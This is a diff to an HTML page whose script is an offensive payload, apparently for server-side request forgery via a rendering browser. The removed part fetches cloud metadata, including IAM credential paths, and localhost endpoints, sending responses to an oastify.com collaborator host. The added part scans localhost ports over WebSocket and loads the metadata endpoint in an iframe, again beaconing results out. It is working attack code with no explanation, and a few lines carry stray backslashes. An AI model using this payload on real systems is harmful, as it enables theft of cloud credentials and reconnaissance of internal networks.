@@ -10,31 +10,38 @@
 </form>
 <script>
 const collab = "9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com";
-const targets = [
-  "http://169.254.169.254/latest/meta-data/",
-  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-  "http://127.0.0.1/",
-  "http://127.0.0.1:8080/mcp",
-];
 
-targets.forEach(url => {
-  // Try XMLHttpRequest sync
-  try {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', url, false); // synchronous
-    xhr.send();
-    var data = encodeURIComponent(xhr.responseText.substring(0, 200));
-    new Image().src = `http://${collab}/?url=${encodeURIComponent(url)}&data=${data}&status=${xhr.status}`;
-  } catch(e) {
-    // Try DNS exfil via subdomain
-    var errenc = encodeURIComponent(e.toString()).substring(0,30).replace(/%/g,'x');
-    var sub = errenc.replace(/[^a-zA-Z0-9]/g,'').substring(0,20);
-    new Image().src = `http://${sub}.${collab}/`;
-  }
+// Timing-based port scan via WebSocket
+const ports = [80, 443, 8000, 8080, 3000, 5432, 3306, 6379, 9200, 8888];
+const results = {};
+
+function scanPort(port) {
+  return new Promise(resolve => {
+    const start = Date.now();
+    const ws = new WebSocket(`ws://127.0.0.1:${port}`);
+    ws.onerror = () => resolve({port, time: Date.now()-start, status:'error'});
+    ws.onopen = () => { ws.close(); resolve({port, time: Date.now()-start, status:'open'}); };
+    setTimeout(() => { ws.close(); resolve({port, time: Date.now()-start, status:'timeout'}); }, 2000);
+  });
+}
+
+Promise.all(ports.map(scanPort)).then(results => {
+  const data = results.map(r => `${r.port}:${r.status}:${r.time}ms`).join(',');
+  new Image().src = `http://${collab}/?portscan=${encodeURIComponent(data)}`;
 });
 
-// Also try location-based redirect to internal
-// window.location = "http://169.254.169.254/latest/meta-data/"\;
+// Also try iframe to capture internal content
+const iframe = document.createElement('iframe');
+iframe.src = 'http://169.254.169.254/latest/meta-data/'\;
+iframe.onload = function() {
+  try {
+    const content = iframe.contentDocument.body.innerText;
+    new Image().src = `http://${collab}/?iframe_data=${encodeURIComponent(content.substring(0,300))}`;
+  } catch(e) {
+    new Image().src = `http://${collab}/?iframe_err=${encodeURIComponent(e.toString())}`;
+  }
+};
+document.body.appendChild(iframe);
 </script>
 </body>
 </html>
